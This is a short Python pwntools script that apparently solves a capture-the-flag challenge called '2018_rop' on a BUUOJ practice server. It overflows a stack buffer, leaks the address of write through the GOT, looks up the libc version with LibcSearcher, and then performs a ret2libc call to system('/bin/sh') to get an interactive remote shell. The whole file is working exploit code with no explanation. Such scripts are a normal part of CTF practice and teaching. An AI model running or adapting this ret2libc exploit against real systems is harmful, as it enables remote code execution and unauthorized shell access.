from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./2018_rop')
write_got = elf.got['write']
write_plt = elf.plt['write']
main = 0x080484c6
ret = 0x0804849c

#conn = process('./2018_rop')
#gdb.attach(conn, 'b *0x08048496')
conn = remote('node4.buuoj.cn', 28111)

payload = b'a' * (0x88 + 0x4)
payload += p32(write_plt) + p32(main) + p32(0x1) + p32(write_got) + p32(0x4)
conn.send(payload)
res = conn.recv()
leak_addr = u32(res[:])
print(f'leak_addr: {hex(leak_addr)}')

libc = LibcSearcher('write', leak_addr)
libc_base = leak_addr - libc.dump('write')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
exit = libc_base + libc.dump('exit')
payload = b'a' * (0x88 + 0x4) + p32(system) + p32(exit) + p32(binsh)
conn.sendline(payload)
#conn.recv()
conn.interactive()

